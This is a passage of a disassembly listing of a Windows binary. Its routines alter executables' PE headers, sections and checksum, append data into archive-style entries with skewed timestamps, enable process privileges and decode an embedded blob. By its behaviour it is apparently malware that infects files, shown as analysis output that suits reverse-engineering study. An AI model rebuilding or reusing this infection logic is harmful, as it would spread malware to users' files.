		mov	[ebp+var_14], ebx
		jz	loc_404E69
		push	edi
		push	[ebp+var_8]
		push	3
		push	ebx
		call	sub_404BDB
		mov	edi, eax
		add	esp, 0Ch
		cmp	edi, esi
		jz	loc_404E5E
		push	[ebp+var_4]
		push	3
		push	[ebp+arg_4]
		call	sub_404BDB
		mov	esi, eax
		add	esp, 0Ch
		test	esi, esi
		jz	loc_404E5E
		push	[ebp+var_4]
		push	[ebp+arg_4]
		call	sub_404B9C
		push	[ebp+var_8]
		mov	[ebp+arg_8], eax
		push	ebx
		call	sub_404B9C
		mov	ecx, [ebp+arg_8]
		mov	edx, [ebp+arg_4]
		add	ecx, edx
		add	esp, 10h
		cmp	word ptr [ecx+5Ch], 2
		jnz	loc_404E5E
		mov	ecx, [ecx+8Ch]
		add	ebx, eax
		mov	[ebp+arg_8], ecx
		mov	[ebx+8Ch], ecx
		mov	eax, [esi+8]
		mov	ecx, [edi+0Ch]
		mov	[edi+8], eax
		mov	eax, [esi]
		mov	[edi], eax
		mov	eax, [edi+8]
		add	eax, ecx
		mov	[ebp+var_10], eax
		mov	eax, [esi+4]
		mov	[ebp+var_1C], eax
		mov	eax, [edi+4]
		mov	[ebp+var_18], eax
		mov	eax, [esi+8]
		mov	esi, [esi+0Ch]
		add	esi, edx
		mov	edx, [ebp+var_14]
		lea	edi, [ecx+edx]
		mov	ecx, eax
		sub	ecx, [ebp+arg_4]
		add	ecx, esi
		cmp	ecx, [ebp+var_4]
		ja	short loc_404E5E
		push	eax
		push	esi
		push	edi
		call	_memcpy
		push	[ebp+arg_8]
		push	[ebp+var_18]
		push	[ebp+var_1C]
		push	edi
		push	edi
		call	sub_404C4B
		movzx	ecx, word ptr [ebx+14h]
		mov	[ebp+var_C], eax
		mov	edx, ebx
		movzx	eax, word ptr [ebx+6]
		add	edx, ecx
		add	esp, 20h
		lea	eax, [eax+eax*4]
		lea	ecx, [edx+eax*8-8]
		mov	eax, [edx+eax*8-4]
		add	eax, [ecx]
		test	ax, 0FFFh
		jz	short loc_404E5B
		shr	eax, 0Ch
		inc	eax
		shl	eax, 0Ch

loc_404E5B:				; CODE XREF: sub_404CF1+161j
		mov	[ebx+50h], eax

loc_404E5E:				; CODE XREF: sub_404CF1+8Dj
					; sub_404CF1+A7j ...
		lea	ecx, [ebp+var_2C]
		call	sub_401808
		xor	esi, esi
		pop	edi

loc_404E69:				; CODE XREF: sub_404CF1+74j
		lea	ecx, [ebp+var_3C]
		call	sub_401808
		cmp	[ebp+var_C], esi
		pop	ebx
		jz	short loc_404E96
		mov	eax, [ebp+var_10]
		cmp	eax, [ebp+var_4]
		jnb	short loc_404E82
		mov	eax, [ebp+var_4]

loc_404E82:				; CODE XREF: sub_404CF1+18Cj
		push	eax
		push	[ebp+arg_0]
		call	sub_403F63
		push	[ebp+arg_0]
		call	sub_404FDF
		add	esp, 0Ch

loc_404E96:				; CODE XREF: sub_404CF1+184j
		mov	eax, [ebp+var_C]

loc_404E99:				; CODE XREF: sub_404CF1+3Fj
		pop	esi
		leave
		retn
sub_404CF1	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_404E9C	proc near		; CODE XREF: sub_4060CD+D3p
					; sub_40686A+7Fp

var_14		= dword	ptr -14h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	ebx
		push	esi
		lea	ecx, [ebp+var_14]
		call	sub_40174B
		xor	esi, esi
		lea	eax, [ebp+var_4]
		push	esi
		push	eax
		push	[ebp+arg_0]
		lea	ecx, [ebp+var_14]
		call	sub_40174E
		mov	ebx, eax
		cmp	ebx, esi
		jnz	short loc_404ECB
		xor	eax, eax
		jmp	loc_404F88
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_404ECB:				; CODE XREF: sub_404E9C+26j
		push	edi
		push	[ebp+var_4]
		push	ebx
		call	sub_404B9C
		mov	edi, eax
		pop	ecx
		test	edi, edi
		pop	ecx
		jz	loc_404F62
		push	[ebp+var_4]
		push	3
		push	ebx
		call	sub_404BDB
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_404F62
		push	10h
		lea	esi, [edi+ebx]
		pop	edx
		mov	[esi+8Ch], edx
		mov	ecx, [eax+4]
		add	ecx, edx
		mov	[eax], edx
		test	cx, 0FFFh
		mov	[eax+8], edx
		jz	short loc_404F17
		shr	ecx, 0Ch
		inc	ecx
		shl	ecx, 0Ch

loc_404F17:				; CODE XREF: sub_404E9C+72j
		mov	[esi+50h], ecx
		mov	ecx, [eax+0Ch]
		mov	edi, [eax+8]
		add	edi, ecx
		cmp	edi, [ebp+arg_4]
		jnb	short loc_404F2A
		mov	edi, [ebp+arg_4]

loc_404F2A:				; CODE XREF: sub_404E9C+89j
		test	di, 0FFFh
		jz	short loc_404F38
		shr	edi, 0Ch
		inc	edi
		shl	edi, 0Ch

loc_404F38:				; CODE XREF: sub_404E9C+93j
		lea	eax, [ecx+ebx]
		mov	ecx, eax
		sub	ecx, ebx
		cmp	ecx, [ebp+var_4]
		jnb	short loc_404F50
		push	edx		; size_t
		push	0		; int
		push	eax		; void *
		call	_memset
		add	esp, 0Ch

loc_404F50:				; CODE XREF: sub_404E9C+A6j
		mov	eax, [esi+0ECh]
		test	eax, eax
		jz	short loc_404F5D
		mov	[esi+28h], eax

loc_404F5D:				; CODE XREF: sub_404E9C+BCj
		push	1
		pop	esi
		jmp	short loc_404F65
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_404F62:				; CODE XREF: sub_404E9C+3Fj
					; sub_404E9C+55j
		mov	edi, [ebp+arg_0]

loc_404F65:				; CODE XREF: sub_404E9C+C4j
		lea	ecx, [ebp+var_14]
		call	sub_401808
		test	esi, esi
		jz	short loc_404F7C
		push	edi
		push	[ebp+arg_0]
		call	sub_403F63
		pop	ecx
		pop	ecx

loc_404F7C:				; CODE XREF: sub_404E9C+D3j
		push	[ebp+arg_0]
		call	sub_404FDF
		pop	ecx
		mov	eax, esi
		pop	edi

loc_404F88:				; CODE XREF: sub_404E9C+2Aj
		pop	esi
		pop	ebx
		leave
		retn
sub_404E9C	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_404F8C	proc near		; CODE XREF: sub_404FDF+4Dp

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		mov	eax, [ebp+arg_4]
		xor	ecx, ecx
		shr	eax, 1
		mov	[ebp+var_4], ecx
		jz	short loc_404FC5
		mov	edx, [ebp+arg_0]
		push	esi
		mov	esi, eax

loc_404FA2:				; CODE XREF: sub_404F8C+33j
		movzx	eax, word ptr [edx]
		add	ecx, eax
		mov	[ebp+arg_0], ecx
		mov	eax, [ebp+arg_0]
		shr	eax, 10h
		mov	[ebp+arg_0], eax
		and	ecx, 0FFFFh
		add	ecx, [ebp+arg_0]
		inc	edx
		inc	edx
		dec	esi
		jnz	short loc_404FA2
		mov	[ebp+var_4], ecx
		pop	esi

loc_404FC5:				; CODE XREF: sub_404F8C+Ej
		mov	[ebp+arg_0], ecx
		mov	eax, [ebp+arg_0]
		shr	eax, 10h
		mov	edx, [ebp+var_4]
		add	ax, dx
		mov	[ebp+arg_0], eax
		mov	eax, [ebp+arg_0]
		add	eax, [ebp+arg_4]
		leave
		retn
sub_404F8C	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_404FDF	proc near		; CODE XREF: sub_404CF1+19Dp
					; sub_404E9C+E3p

var_14		= dword	ptr -14h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	esi
		push	edi
		lea	ecx, [ebp+var_14]
		call	sub_40174B
		and	[ebp+var_4], 0
		xor	esi, esi
		lea	eax, [ebp+var_4]
		push	esi
		push	eax
		lea	ecx, [ebp+var_14]
		push	[ebp+arg_0]
		call	sub_40174E
		mov	edi, eax
		test	edi, edi
		jz	short loc_405046
		push	[ebp+var_4]
		push	edi
		call	sub_404B9C
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_40503C
		cmp	dword ptr [eax+edi+58h], 0
		lea	esi, [eax+edi+58h]
		jz	short loc_405037
		and	dword ptr [esi], 0
		push	[ebp+var_4]
		push	edi
		call	sub_404F8C
		pop	ecx
		mov	[esi], eax
		pop	ecx
		jmp	short loc_40503A
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_405037:				; CODE XREF: sub_404FDF+44j
		mov	eax, [ebp+arg_0]

loc_40503A:				; CODE XREF: sub_404FDF+56j
		mov	esi, eax

loc_40503C:				; CODE XREF: sub_404FDF+39j
		lea	ecx, [ebp+var_14]
		call	sub_401808
		mov	eax, esi

loc_405046:				; CODE XREF: sub_404FDF+2Aj
		pop	edi
		pop	esi
		leave
		retn
sub_404FDF	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_40504A	proc near		; CODE XREF: sub_40565D+2Cp

WideCharStr	= word ptr -800h
lpMultiByteStr	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 800h
		cmp	dword_491EF8, 0
		jnz	short loc_405091
		cmp	dword_491F18, 0
		jz	short loc_405091
		lea	eax, [ebp+WideCharStr]
		push	0C8h		; cchWideChar
		push	eax		; lpWideCharStr
		push	0FFFFFFFFh	; cchMultiByte
		push	[ebp+lpMultiByteStr] ; lpMultiByteStr
		push	1		; dwFlags
		push	0		; CodePage
		call	ds:MultiByteToWideChar
		lea	eax, [ebp+WideCharStr]
		push	eax
		push	0
		call	dword_491F18
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_405091:				; CODE XREF: sub_40504A+10j
					; sub_40504A+19j
		xor	eax, eax
		leave
		retn
sub_40504A	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_405095	proc near		; CODE XREF: sub_4050FD+137p
					; sub_4050FD+18Bp

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		push	edi
		mov	eax, [ebp+arg_0]
		mov	[ebp+var_8], eax
		mov	eax, [ebp+arg_4]
		mov	[ebp+var_C], eax
		mov	esi, [ebp+var_8]
		mov	edi, [ebp+var_C]
		push	ecx
		push	edx
		push	ebx
		xor	ecx, ecx
		dec	ecx
		mov	edx, ecx

loc_4050B8:				; CODE XREF: sub_405095+4Cj
		xor	eax, eax
		xor	ebx, ebx
		lodsb
		xor	al, cl
		mov	cl, ch
		mov	ch, dl
		mov	dl, dh
		mov	dh, 8

loc_4050C7:				; CODE XREF: sub_405095+45j
		shr	bx, 1
		rcr	ax, 1
		jnb	short loc_4050D8
		xor	ax, 8320h
		xor	bx, 0EDB8h

loc_4050D8:				; CODE XREF: sub_405095+38j
		dec	dh
		jnz	short loc_4050C7
		xor	ecx, eax
		xor	edx, ebx
		dec	edi
		jnz	short loc_4050B8
		not	edx
		not	ecx
		pop	ebx
		mov	eax, edx
		rol	eax, 10h
		mov	ax, cx
		pop	edx
		pop	ecx
		mov	[ebp+var_4], eax
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_405095	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4050FD	proc near		; CODE XREF: sub_406AB2+15Ep

Buffer		= dword	ptr -14Ch
var_147		= word ptr -147h
var_145		= dword	ptr -145h
var_141		= dword	ptr -141h
var_13D		= byte ptr -13Dh
var_13C		= dword	ptr -13Ch
var_138		= dword	ptr -138h
var_134		= byte ptr -134h
var_133		= byte ptr -133h
var_132		= word ptr -132h
var_130		= dword	ptr -130h
var_12C		= byte ptr -12Ch
var_2C		= dword	ptr -2Ch
NumberOfBytesWritten= dword ptr	-1Ch
nNumberOfBytesToWrite= dword ptr -18h
SystemTime	= _SYSTEMTIME ptr -14h
var_4		= dword	ptr -4
hObject		= dword	ptr  8
lpBuffer	= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 14Ch
		push	ebx
		push	esi
		push	edi
		push	3
		pop	edi
		lea	ecx, [ebp+var_2C]
		call	sub_40174B
		push	[ebp+arg_8]	; char *
		call	_strlen
		mov	esi, eax
		pop	ecx
		lea	eax, [ebp+SystemTime]
		add	esi, 20h
		push	eax		; lpSystemTime
		call	ds:GetLocalTime
		and	[ebp+SystemTime.wMonth], 0FFFEh
		xor	ebx, ebx
		push	ebx
		call	sub_4046AB
		pop	ecx
		xor	edx, edx
		push	1Eh
		pop	ecx
		div	ecx
		sub	[ebp+SystemTime.wMinute], dx
		cmp	[ebp+SystemTime.wMinute], 3Ch
		jb	short loc_405153
		mov	[ebp+SystemTime.wMinute], 1

loc_405153:				; CODE XREF: sub_4050FD+4Ej
		mov	al, byte ptr [ebp+SystemTime.wMinute]
		mov	ecx, [ebp-0Ch]
		and	eax, 3Fh
		shl	ecx, 6
		or	eax, ecx
		mov	cl, byte ptr [ebp+SystemTime.wSecond]
		shr	cl, 1
		shl	eax, 5
		and	ecx, 1Fh
		or	eax, ecx
		mov	cl, byte ptr [ebp+var_4+2]
		mov	word ptr [ebp+var_4], ax
		mov	eax, dword ptr [ebp+SystemTime.wYear]
		add	eax, 44h
		and	ecx, 1Fh
		shl	eax, 9
		xor	eax, ecx
		mov	cl, byte ptr [ebp+SystemTime.wMonth]
		and	ecx, 0Fh
		and	ax, 0FE1Fh
		shl	ecx, 5
		or	eax, ecx
		mov	cl, byte ptr [ebp+SystemTime.wDay]
		mov	word ptr [ebp+var_4+2],	ax
		xor	cl, byte ptr [ebp+var_4+2]
		and	ecx, 1Fh
		xor	ax, cx
		cmp	[ebp+arg_C], ebx
		mov	word ptr [ebp+var_4+2],	ax
		jz	short loc_4051AE
		push	2
		pop	edi

loc_4051AE:				; CODE XREF: sub_4050FD+ACj
		push	20h		; dwFileAttributes
		push	[ebp+hObject]	; lpFileName
		call	ds:SetFileAttributesA
		push	ebx		; hTemplateFile
		push	20h		; dwFlagsAndAttributes
		push	edi		; dwCreationDisposition
		push	ebx		; lpSecurityAttributes
		push	3		; dwShareMode
		push	0C0000000h	; dwDesiredAccess
		push	[ebp+hObject]	; lpFileName
		call	ds:CreateFileA
		cmp	eax, 0FFFFFFFFh
		mov	[ebp+hObject], eax
		jnz	short loc_4051DD
		xor	eax, eax
		jmp	loc_4052EB
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4051DD:				; CODE XREF: sub_4050FD+D7j
		push	2		; dwMoveMethod
		push	ebx		; lpDistanceToMoveHigh
		push	ebx		; lDistanceToMove
		push	eax		; hFile
		call	ds:SetFilePointer
		lea	eax, [ebp+nNumberOfBytesToWrite]
		push	1
		push	eax
		lea	ecx, [ebp+var_2C]
		push	[ebp+lpBuffer]
		call	sub_40174E
		cmp	eax, ebx
		mov	[ebp+lpBuffer],	eax
		jz	loc_4052E0
		mov	eax, [ebp+nNumberOfBytesToWrite]
		mov	byte ptr [ebp+Buffer+2], 74h
		push	eax
		mov	word ptr [ebp+Buffer+3], 8000h
		push	[ebp+lpBuffer]
		mov	[ebp+var_147], si
		mov	[ebp+var_145], eax
		mov	[ebp+var_141], eax
		mov	[ebp+var_13D], bl
		call	sub_405095
		push	[ebp+arg_8]	; char *
		mov	[ebp+var_13C], eax
		mov	eax, [ebp+var_4]
		mov	[ebp+var_134], 14h
		mov	[ebp+var_138], eax
		mov	[ebp+var_133], 30h
		call	_strlen
		push	[ebp+arg_8]	; char *
		mov	[ebp+var_132], ax
		lea	eax, [ebp+var_12C]
		mov	[ebp+var_130], ebx
		push	eax		; char *
		call	_strcpy
		movzx	edi, si
		lea	eax, [edi-2]
		push	eax
		lea	eax, [ebp+Buffer+2]
		push	eax
		call	sub_405095
		mov	esi, ds:WriteFile
		add	esp, 1Ch
		cmp	[ebp+arg_C], ebx
		mov	word ptr [ebp+Buffer], ax
		jz	short loc_4052B3
		lea	eax, [ebp+NumberOfBytesWritten]
		push	ebx		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		push	14h		; nNumberOfBytesToWrite
		push	offset unk_40FD88 ; lpBuffer
		push	[ebp+hObject]	; hFile
		call	esi ; WriteFile

loc_4052B3:				; CODE XREF: sub_4050FD+1A3j
		lea	eax, [ebp+NumberOfBytesWritten]
		push	ebx		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		lea	eax, [ebp+Buffer]
		push	edi		; nNumberOfBytesToWrite
		push	eax		; lpBuffer
		push	[ebp+hObject]	; hFile
		call	esi ; WriteFile
		lea	eax, [ebp+NumberOfBytesWritten]
		push	ebx		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		push	[ebp+nNumberOfBytesToWrite] ; nNumberOfBytesToWrite
		push	[ebp+lpBuffer]	; lpBuffer
		push	[ebp+hObject]	; hFile
		call	esi ; WriteFile
		lea	ecx, [ebp+var_2C]
		call	sub_401808
		push	1
		pop	ebx

loc_4052E0:				; CODE XREF: sub_4050FD+101j
		push	[ebp+hObject]	; hObject
		call	ds:CloseHandle
		mov	eax, ebx

loc_4052EB:				; CODE XREF: sub_4050FD+DBj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4050FD	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4052F0	proc near		; CODE XREF: sub_4060CD:loc_4060FAp
					; sub_4060CD:loc_40614Cp

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		mov	ecx, dword_491F1C
		and	[ebp+var_4], 0
		push	1
		test	ecx, ecx
		pop	eax
		jz	short locret_40530D
		lea	eax, [ebp+var_4]
		push	0
		push	eax
		call	ecx

locret_40530D:				; CODE XREF: sub_4052F0+13j
		leave
		retn
sub_4052F0	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_40530F	proc near		; CODE XREF: sub_4013FA+21p
					; sub_4053E8+F8p

PreviousState	= _TOKEN_PRIVILEGES ptr	-660h
NewState	= _TOKEN_PRIVILEGES ptr	-20h
ReturnLength	= dword	ptr -10h
Luid		= _LUID	ptr -0Ch
var_4		= dword	ptr -4
hObject		= dword	ptr  8
lpName		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 660h
		mov	eax, [ebp+hObject]
		push	ebx
		xor	ebx, ebx
		mov	[ebp+ReturnLength], 640h
		cmp	eax, ebx
		mov	[ebp+var_4], ebx
		jnz	short loc_405332
		call	ds:GetCurrentProcess

loc_405332:				; CODE XREF: sub_40530F+1Bj
		lea	ecx, [ebp+hObject]
		push	ecx		; TokenHandle
		push	28h		; DesiredAccess
		push	eax		; ProcessHandle
		call	ds:OpenProcessToken ; Open the access token associated with a process
		test	eax, eax
		jz	loc_4053E5
		push	esi
		lea	eax, [ebp+Luid]
		push	edi
		push	eax		; lpLuid
		push	[ebp+lpName]	; lpName
		push	ebx		; lpSystemName
		call	ds:LookupPrivilegeValueA
		test	eax, eax
		jz	short loc_4053D7
		mov	eax, [ebp+Luid.LowPart]
		mov	esi, ds:AdjustTokenPrivileges ;	Enable/disable privileges in the specified access token
		mov	[ebp+NewState.Privileges.Luid.LowPart],	eax
		mov	eax, [ebp+Luid.HighPart]
		mov	[ebp+NewState.Privileges.Luid.HighPart], eax
		lea	eax, [ebp+ReturnLength]
		push	eax		; ReturnLength
		lea	eax, [ebp+PreviousState]
		push	eax		; PreviousState
		lea	eax, [ebp+NewState]
		push	10h		; BufferLength
		push	eax		; NewState
		push	ebx		; DisableAllPrivileges
		mov	[ebp+NewState.PrivilegeCount], ebx
		push	[ebp+hObject]	; TokenHandle
		mov	[ebp+NewState.Privileges.Attributes], ebx
		call	esi ; AdjustTokenPrivileges ; Enable/disable privileges	in the specified access	token
		mov	edi, ds:GetLastError
		call	edi ; GetLastError
		test	eax, eax
		jnz	short loc_4053D7
		mov	eax, [ebp+Luid.LowPart]
		or	[ebp+PreviousState.Privileges.Attributes], 2
		mov	[ebp+PreviousState.Privileges.Luid.LowPart], eax
		mov	eax, [ebp+Luid.HighPart]
		mov	[ebp+PreviousState.Privileges.Luid.HighPart], eax
		push	ebx		; ReturnLength
		push	ebx		; PreviousState
		lea	eax, [ebp+PreviousState]
		push	10h		; BufferLength
		push	eax		; NewState
		push	ebx		; DisableAllPrivileges
		mov	[ebp+PreviousState.PrivilegeCount], 1
		push	[ebp+hObject]	; TokenHandle
		call	esi ; AdjustTokenPrivileges ; Enable/disable privileges	in the specified access	token
		call	edi ; GetLastError
		test	eax, eax
		jnz	short loc_4053D7
		mov	[ebp+var_4], 1

loc_4053D7:				; CODE XREF: sub_40530F+4Aj
					; sub_40530F+85j ...
		push	[ebp+hObject]	; hObject
		call	ds:CloseHandle
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi

loc_4053E5:				; CODE XREF: sub_40530F+32j
		pop	ebx
		leave
		retn
sub_40530F	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4053E8	proc near		; CODE XREF: WinMain(x,x,x,x)+18p

VersionInformation= _OSVERSIONINFOA ptr	-94h

		push	ebp
		mov	ebp, esp
		sub	esp, 94h
		push	ebx
		push	esi
		push	edi
		push	1
		pop	ebx
		push	ebx
		call	sub_4046AB
		mov	esi, 104h
		xor	edi, edi
		push	esi		; size_t
		push	edi		; int
		push	offset byte_491DF4 ; void *
		call	_memset
		push	esi		; size_t
		push	edi		; int
		push	offset byte_491CF0 ; void *
		call	_memset
		push	esi		; size_t
		push	edi		; int
		push	offset FileName	; void *
		call	_memset
		push	esi		; size_t
		push	edi		; int
		push	offset unk_491AE8 ; void *
		call	_memset
		push	esi		; size_t
		push	edi		; int
		push	offset unk_4919E4 ; void *
		call	_memset
		add	esp, 40h
		push	offset unk_40E0D0
		push	1F16h
		push	offset unk_40E0D4
		call	sub_403529
		push	offset dword_491F00
		call	sub_402642
		add	esp, 10h
		call	ds:GetVersion	; Get current version number of	Windows
					; and information about	the operating system platform
		and	eax, 80000000h
		mov	dword_491F08, edi
		mov	dword_491EF8, eax
		lea	eax, [ebp+VersionInformation]
		push	eax		; lpVersionInformation
		mov	[ebp+VersionInformation.dwOSVersionInfoSize], 94h
		call	ds:GetVersionExA ; Get extended	information about the
					; version of the operating system
		cmp	[ebp+VersionInformation.dwMajorVersion], 5
		jnz	short loc_4054A8
		cmp	[ebp+VersionInformation.dwMinorVersion], ebx
		jnz	short loc_4054A8
		mov	dword_491F08, ebx

loc_4054A8:				; CODE XREF: sub_4053E8+B0j
					; sub_4053E8+B8j
		call	sub_4048EF
		mov	esi, 7D000h
		push	esi
		call	??2@YAPAXI@Z	; operator new(uint)
		cmp	eax, edi
		pop	ecx
		mov	dword_4919E0, eax
		jnz	short loc_4054C6
		xor	eax, eax
		jmp	short loc_4054EA
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4054C6:				; CODE XREF: sub_4053E8+D8j
		push	esi		; size_t
		push	edi		; int
		push	eax		; void *
		call	_memset
		call	sub_4055A8
		push	ebx
		push	(offset	aYYTyXxnYtWyTTY+3Ch)
		call	sub_403434
		push	eax
		push	edi
		call	sub_40530F
		add	esp, 1Ch
		mov	eax, ebx

loc_4054EA:				; CODE XREF: sub_4053E8+DCj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4053E8	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4054EF	proc near		; CODE XREF: sub_40280F+1B4p
					; sub_40565D+24Dp ...

var_14		= dword	ptr -14h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	edi
		lea	ecx, [ebp+var_14]
		call	sub_40174B
		lea	eax, [ebp+var_4]
		push	0
		push	eax
		lea	ecx, [ebp+var_14]
		push	[ebp+arg_0]
		call	sub_40174E
		mov	edi, eax
		test	edi, edi
		jz	loc_4055A5
		push	esi
		mov	esi, 1000h
		cmp	[ebp+var_4], esi
		jnb	short loc_405528
		xor	esi, esi
		jmp	short loc_40559A
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_405528:				; CODE XREF: sub_4054EF+33j
		push	ebx
		push	[ebp+arg_4]	; char *
		call	_strlen
		mov	ebx, eax
		mov	eax, [ebp+var_4]
		add	eax, 0FFFFFC18h
		pop	ecx
		cmp	eax, esi
		jbe	short loc_405596

loc_405540:				; CODE XREF: sub_4054EF+70j
		lea	eax, [esi+edi]
		push	ebx		; size_t
		push	eax		; char *
		push	[ebp+arg_4]	; char *
		call	_strncmp
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_405563
		mov	eax, [ebp+var_4]
		inc	esi
		add	eax, 0FFFFFC18h
		cmp	esi, eax
		jb	short loc_405540
		jmp	short loc_405596
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_405563:				; CODE XREF: sub_4054EF+63j
		lea	edi, [esi+edi+14h]
		mov	esi, 1F16h
		lea	ebx, [edi-4]
		push	ebx
		push	esi
		push	edi
		call	sub_403529
		mov	eax, [ebp+arg_4]
		push	esi
		add	eax, 14h
		push	eax
		push	edi
		call	_memcpy
		push	ebx
		call	sub_403496
		push	ebx
		push	esi
		push	edi
		call	sub_4034CD
		add	esp, 28h

loc_405596:				; CODE XREF: sub_4054EF+4Fj
					; sub_4054EF+72j
		push	1
		pop	esi
		pop	ebx

